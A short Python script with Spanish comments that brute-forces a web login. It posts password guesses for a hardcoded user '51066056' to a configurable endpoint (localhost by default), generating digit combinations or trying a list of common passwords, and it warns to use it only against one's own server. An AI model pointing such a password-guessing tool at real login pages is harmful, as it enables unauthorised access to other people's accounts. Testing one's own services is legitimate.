#!/usr/bin/env python3
"""
Cliente de prueba de login (solo el cliente).

Le pega a TU endpoint (una URL tuya) y prueba combinaciones de contrasena
para el usuario 51066056. Cuando alguna da 200, te avisa que la adivino.

IMPORTANTE: usalo SOLO contra un servidor tuyo, del que sos duenio. Probar
contrasenas contra un sitio ajeno es acceso no autorizado (ilegal).

Uso:
    python cliente.py                 # genera combinaciones (fuerza bruta) -- por defecto
    python cliente.py lista           # prueba una lista fija en vez de generar
"""

import sys
import string
import itertools

import requests  # si no lo tenes: pip install requests

# ================== CONFIG (ajusta esto a tu endpoint) ==================
URL = "http://127.0.0.1:8000/login"   # <-- PONE ACA TU URL / ENDPOINT
CAMPO_USUARIO = "u"                    # nombre del campo del usuario que espera tu server
CAMPO_PASS = "password"               # nombre del campo de la contrasena

USUARIO = "51066056"

# Que caracteres y que largo generar en modo fuerza bruta.
# Para testear con "000" dejalo en digits (encuentra "000" al toque).
CHARSET = string.digits               # ver tabla en el README de abajo para "todos los caracteres"
LARGO_MIN = 1
LARGO_MAX = 3
# =======================================================================


def probar(password):
    """Manda un POST de login y devuelve True si entro (codigo 200)."""
    datos = {CAMPO_USUARIO: USUARIO, CAMPO_PASS: password}
    try:
        r = requests.post(URL, data=datos, timeout=5)
    except requests.exceptions.ConnectionError:
        print(f"[error] no me puedo conectar a {URL} -- esta levantado tu server?")
        sys.exit(1)
    return r.status_code == 200


def generando():
    """Genera TODAS las combinaciones de CHARSET y las prueba una por una."""
    total = sum(len(CHARSET) ** n for n in range(LARGO_MIN, LARGO_MAX + 1))
    print(f"[cliente] generando combinaciones de '{CHARSET}' "
          f"largo {LARGO_MIN}-{LARGO_MAX}  ({total} en total)...")

    intentos = 0
    for largo in range(LARGO_MIN, LARGO_MAX + 1):
        for combo in itertools.product(CHARSET, repeat=largo):
            pw = "".join(combo)
            intentos += 1
            if probar(pw):
                print(f"\n[cliente] >>> ADIVINADA en el intento {intentos}: la contrasena es '{pw}'")
                return pw
    print(f"\n[cliente] no la encontre despues de {intentos} intentos")
    return None


def desde_lista():
    """Prueba una lista fija de contrasenas (mas rapido)."""
    candidatos = ["1234", "admin", "password", "000", "qwerty"]
    print(f"[cliente] probando {len(candidatos)} contrasenas de la lista...")
    for pw in candidatos:
        if probar(pw):
            print(f"[cliente] >>> ADIVINADA: la contrasena es '{pw}'")
            return pw
    print("[cliente] ninguna de la lista funciono")
    return None


if __name__ == "__main__":
    modo = sys.argv[1] if len(sys.argv) > 1 else "generar"
    if modo == "lista":
        desde_lista()
    else:
        generando()
